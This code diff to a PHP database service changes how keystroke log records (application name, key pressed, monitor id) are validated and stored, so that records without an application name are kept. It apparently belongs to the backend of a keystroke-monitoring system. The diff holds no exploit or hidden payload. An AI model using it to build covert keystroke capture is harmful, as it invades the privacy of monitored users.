@@ -156,13 +156,15 @@ class DatabaseService {
         $inserted_count = 0;
         foreach ($keyLogs as $keyLog) {
             $keyDate = $this->normalizeDateTime($keyLog['date'] ?? null);
-            $application = $keyLog['application'] ?? '';
-            $keyPressed = $keyLog['key'] ?? '';
-            
-            // Skip records with missing required fields
-            if (empty($application) || empty($keyPressed)) {
-                continue;
-            }
+            // Older clients can omit the application name or send a bare
+            // keyboard key event. Keep valid key data instead of discarding it.
+            $application = trim((string)($keyLog['application'] ?? ''));
+            if($application==='')$application='Unknown app';
+            $keyPressed = (string)($keyLog['key'] ?? $keyLog['key_pressed'] ?? '');
+            if($keyPressed==='')continue;
+            $application=mb_substr($application,0,255);
+            $keyPressed=mb_substr($keyPressed,0,100);
+
             
             $stmt->bind_param("isss", $monitor_id, $keyDate, $application, $keyPressed);
             if ($stmt->execute()) {
